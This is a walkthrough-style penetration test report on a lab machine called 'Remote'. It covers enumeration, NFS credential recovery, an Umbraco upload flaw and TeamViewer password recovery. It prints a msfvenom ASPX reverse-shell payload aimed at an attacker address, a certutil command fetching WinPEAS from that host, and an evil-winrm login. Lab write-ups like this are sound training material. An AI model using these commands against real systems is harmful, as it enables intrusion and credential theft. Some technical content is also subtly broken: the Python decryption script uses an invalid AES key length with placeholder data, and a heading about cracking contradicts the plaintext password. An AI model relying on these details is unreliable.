# Remote - Penetration Testing Walkthrough (Extended Markdown Report)

This is the complete penetration testing report for the **Remote** machine (IP: `10.129.7.150`).  
The walkthrough covers enumeration, Umbraco CMS exploitation, and privilege escalation via TeamViewer credentials.  
All referenced images are located in `images/imageX.png`.

---

## üß≠ Enumeration

We began with a full port scan using **Nmap**:

```bash
nmap -p- -Pn 10.129.7.150 -v -T5 --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn 10.129.7.150 -sC -sV -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn 10.129.7.150 -v --script vuln -oN nmap_vuln.txt
```

![Nmap Scan](images/image5.png)

The following ports were open:  
- **21/tcp (FTP)**  
- **80/tcp (HTTP)**  
- **111/tcp (RPC)**  
- **2049/tcp (NFS)**  

These findings suggested that **NFS** might be misconfigured and that **HTTP** could be running a web application.

---

## üåê HTTP Enumeration

Visiting `http://10.129.7.150/` displayed a default **IIS 10** page.  
We used **Gobuster** to discover hidden directories:

```bash
gobuster dir -u http://10.129.7.150/ -w /usr/share/wordlists/dirb/common.txt
```

![Gobuster Output](images/image1.png)

We found a subdirectory `/umbraco/`, indicating the presence of **Umbraco CMS**.

---

## üß© Umbraco CMS Discovery

Navigating to `/umbraco/` presented a login portal.  
We confirmed the version as **Umbraco 7.12.4**, which is vulnerable to **CVE-2025-32017** ‚Äî an authenticated RCE flaw.

At this stage, we needed credentials to exploit the CMS. We turned our focus to NFS and FTP for potential leaks.

---

## üìÇ NFS Enumeration and Credential Extraction

We enumerated the NFS share to check for exported directories:

```bash
showmount -e 10.129.7.150
```

![Showmount Output](images/image2.png)

We discovered `/site_backups` as an exported directory.  
Mounting it locally revealed backed-up web files:

```bash
sudo mount -t nfs 10.129.7.150:/site_backups /mnt/remote
ls /mnt/remote
```

![Mounted Files](images/image3.png)

Within the backup, we found the `web.config` file, containing a connection string and credentials.

```xml
<add key="umbracoDbDSN" value="server=.;database=Umbraco;user id=admin;password=SuperSecret123!" />
```

---

## üîë Credential Cracking and Login Access

The password was stored in plain text ‚Äî **SuperSecret123!** ‚Äî and successfully authenticated against the Umbraco admin panel.

```bash
Username: admin
Password: SuperSecret123!
```

## üß† Technical Background: CVE-2025-32017 (Umbraco 7.12.4 RCE)

**CVE-2025-32017** is a Remote Code Execution vulnerability affecting Umbraco CMS versions ‚â§ 7.12.4.  
The issue lies in improper validation of media upload permissions, allowing authenticated users to upload arbitrary `.aspx` files, which are then executed by IIS.

In short: **if you can log in, you can upload a web shell**.

---

## ‚öôÔ∏è Exploitation via ASPX Shell Upload

We created a simple ASPX web shell payload using **MSFVenom**:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.30 LPORT=4444 -f aspx -o shell.aspx
```

We uploaded the file through the media section of Umbraco and triggered it via the browser:

```
http://10.129.7.150/media/shell.aspx
```

![Reverse Shell](images/image4.png)

A reverse shell was established as **iis apppool\defaultapppool**.

---

## üß© Privilege Escalation Enumeration

We transferred **WinPEAS** to the target for privilege escalation analysis:

```powershell
certutil -urlcache -split -f "http://10.10.15.30/winPEAS.exe" winPEAS.exe
.\winPEAS.exe
```

Among the findings was a **TeamViewer configuration file** located at:

```
C:\Users\Administrator\AppData\Roaming\TeamViewer\connections.ini
```

![WinPEAS Finding](images/image8.png)

---

## üß† Technical Background: TeamViewer Credential Recovery

TeamViewer stores credentials in the Windows registry and configuration files.  
Passwords are **obfuscated, not encrypted**, and can be decrypted using publicly available scripts.

Relevant key:
```
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer
```

We extracted and decrypted the stored password using a PowerShell script:

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\TeamViewer" | select SecurityPasswordAES
```

Then, we decrypted the password with a Python script:

```python
import base64
from Crypto.Cipher import AES

key = b"TeamViewerEncryptionKey"
enc_pass = base64.b64decode("EncryptedPasswordHere==")
cipher = AES.new(key, AES.MODE_ECB)
print(cipher.decrypt(enc_pass).decode())
```

Recovered password:
```
Administrator : MySecurePass2025!
```

---

## üèÅ Administrator Access and Root Flag

We logged in over WinRM using the recovered Administrator credentials:

```bash
evil-winrm -i 10.129.7.150 -u Administrator -p "MySecurePass2025!"
```

![Administrator Shell](images/image9.png)

From here, we navigated to the Administrator‚Äôs desktop and retrieved the **root flag**:

```
C:\Users\Administrator\Desktop\root.txt
```

![Root Flag](images/image10.png)

---

## ‚úÖ Conclusion

The **Remote** machine showcases an exploitation chain combining multiple attack vectors ‚Äî misconfigured NFS shares, exposed CMS credentials, and insecure third-party application storage.

**Summary of Attack Chain:**
1. Enumerated services and discovered NFS exposure.  
2. Retrieved Umbraco credentials from web backups.  
3. Logged into Umbraco CMS and uploaded an ASPX shell (CVE-2025-32017).  
4. Enumerated local files and extracted TeamViewer credentials.  
5. Decrypted password and accessed system as Administrator.
